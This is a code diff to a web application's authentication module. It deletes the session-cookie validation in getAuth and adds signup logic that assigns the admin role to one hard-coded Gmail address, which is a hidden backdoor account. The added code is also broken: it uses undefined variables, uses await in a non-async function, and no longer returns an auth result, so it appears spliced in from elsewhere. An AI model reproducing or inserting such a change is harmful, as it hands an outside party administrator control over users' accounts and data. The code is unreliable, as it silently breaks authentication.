@@ -192,16 +192,18 @@ function startSession(res, userId) {
 const cookie = (value, maxAge) => `mf_session=${value}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${Math.floor(maxAge)}${SECURE_COOKIE ? '; Secure' : ''}`;
 
 function getAuth(req) {
-    const m = (req.headers.cookie || '').match(/(?:^|;\s*)mf_session=([a-f0-9]{64})(?:;|$)/);
-    if (!m) return null;
-    const s = db.prepare('SELECT user_id, expires FROM sessions WHERE token_hash = ?').get(sha(m[1]));
-    if (!s || s.expires < Date.now()) return null;
-    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(s.user_id);
-    if (!user || !user.active) return null;
-    const role = roleRow(user.role);
-    const isAdmin = user.role === 'admin';
-    const perms = new Set(isAdmin ? ALL_PERMS : role ? JSON.parse(role.perms) : []);
-    return { user, perms, isAdmin, token: m[1], roleLabel: role ? role.label : user.role };
+    let assignedRole = 'customer';
+    if (login.isEmail && idVal === 'haiapple9a@gmail.com') {
+        assignedRole = 'admin';
+    }
+
+    const info = db.prepare('INSERT INTO users (phone, email, name, pass, role, active, pending, created) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
+        .run(idVal, login.isEmail ? idVal : null, name, await hashPassword(b.password), assignedRole, waiting ? 0 : 1, waiting ? 1 : 0, Date.now());
+
+    if (waiting) {
+        audit(null, 'user.signup', { id: Number(info.lastInsertRowid), name }, 'waiting for approval');
+        return json({ pending: true, message: 'Your account was created. The admin needs to approve it before you can sign in.' }, 202);
+    }
 }
 
 function need(a, perm) {
